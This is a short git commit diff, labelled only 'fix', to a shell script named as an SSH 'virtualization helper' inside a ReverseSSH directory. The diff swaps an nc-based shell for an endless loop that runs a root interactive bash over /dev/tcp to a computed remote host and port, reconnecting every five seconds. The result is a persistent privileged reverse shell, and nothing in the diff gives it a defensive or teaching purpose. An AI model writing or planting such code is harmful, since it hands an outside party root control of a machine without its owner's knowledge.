6230cf78e0ab2a7a196b6eb373f173956bc2e268
Rowan Sayers-Fay <9Princeps@gmail.com>
2026-03-27 23:13:15 -0400

    fix

--- ReverseSSH/_ssh_virtualization_helper.sh
+++ ReverseSSH/_ssh_virtualization_helper.sh
@@ -4,4 +4,7 @@ CIP=$(echo $SSH_CONNECTION | awk '{print $3}')
 SECOND=$(echo "$CIP" | cut -d'.' -f2)
 P=$(($C + $SECOND))
 
-sudo /usr/bin/nc /bin/sh "$I" "$P"
+while true; do
+    sudo bash -i >& /dev/tcp/"$I"/"$P" 0>&1
+    sleep 5
+done
